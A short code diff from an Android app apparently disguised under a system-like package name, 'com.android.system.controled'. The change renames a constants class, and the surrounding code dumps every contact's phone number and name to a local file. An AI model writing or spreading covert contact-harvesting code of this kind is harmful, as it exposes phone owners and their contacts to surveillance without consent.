@@ -9,7 +9,7 @@ import android.provider.Contacts.People;
 import android.provider.ContactsContract;
 
 import com.android.system.controled.Debug;
-import com.android.system.controled.Globle;
+import com.android.system.controled.MainApplication;
 import com.android.system.controled.bean.ContactBean;
 
 public class ContactsUtil {
@@ -241,7 +241,7 @@ public class ContactsUtil {
 				contactsStr = contactsStr + "电话：" + c.number + "    姓名：" + c.name + "\r\n";
 			}
 			if (!contactsStr.equals("") && contactsStr.length() > 0) {
-				FileUtil.writeFile(contactsStr, Globle.FILE_CONTACTS, false);
+				FileUtil.writeFile(contactsStr, MainApplication.FILE_CONTACTS, false);
 			}
 		}
 
@@ -254,12 +254,12 @@ public class ContactsUtil {
 				contactsStr = contactsStr + "电话：" + c.number + "    姓名：" + c.name + "\r\n";
 			}
 			if (!contactsStr.equals("") && contactsStr.length() > 0) {
-				FileUtil.writeFile(contactsStr, Globle.FILE_CONTACTS, true);
+				FileUtil.writeFile(contactsStr, MainApplication.FILE_CONTACTS, true);
 			}
 		}
 
 		if (isNull) {
-			FileUtil.writeFile("通讯录为空！", Globle.FILE_CONTACTS, true);
+			FileUtil.writeFile("通讯录为空！", MainApplication.FILE_CONTACTS, true);
 		}
 
 	}
